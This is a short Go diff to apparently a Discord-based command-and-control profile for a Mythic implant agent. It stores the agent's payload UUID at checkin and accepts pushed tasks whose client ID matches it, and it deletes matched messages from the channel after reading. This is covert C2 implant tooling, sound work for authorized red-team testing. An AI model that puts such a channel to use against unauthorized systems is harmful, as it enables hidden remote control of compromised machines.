@@ -82,6 +82,7 @@ type DiscordProfile struct {
 	ChannelID     string
 	EncryptionKey string
 	CallbackUUID  string
+	PayloadUUID   string // Stored for matching push C2 messages (Mythic uses payload UUID as TrackingID)
 	SleepInterval int
 	Jitter        int
 	Debug         bool
@@ -275,6 +276,9 @@ func (d *DiscordProfile) nextClientID() string {
 
 // Checkin performs the initial checkin with Mythic via the Discord channel.
 func (d *DiscordProfile) Checkin(agent *structs.Agent) error {
+	// Store payload UUID for matching push C2 messages from Mythic
+	d.PayloadUUID = agent.PayloadUUID
+
 	cfg := d.getConfig()
 	if cfg == nil {
 		return fmt.Errorf("failed to decrypt Discord configuration")
@@ -659,7 +663,8 @@ func (d *DiscordProfile) sendAndPoll(mythicMessage, senderID string, cfg *sensit
 			// - client_id matches our tracking ID (clientID)
 			// - sender_id matches us (senderID)
 			// - client_id matches our sender_id (server echoes sender_id as client_id)
-			if !respWrapper.ToServer && (respWrapper.ClientID == clientID || respWrapper.SenderID == senderID || respWrapper.ClientID == senderID) {
+			// - client_id matches payload UUID (Mythic push C2 uses payload UUID as TrackingID for pushed tasks)
+			if !respWrapper.ToServer && (respWrapper.ClientID == clientID || respWrapper.SenderID == senderID || respWrapper.ClientID == senderID || (d.PayloadUUID != "" && respWrapper.ClientID == d.PayloadUUID)) {
 				fmt.Fprintf(os.Stderr, "[discord]   MATCHED! deleting msg %s", msg.ID)
 				// Delete the response message from the channel after reading
 				d.deleteMessage(msg.ID, cfg)
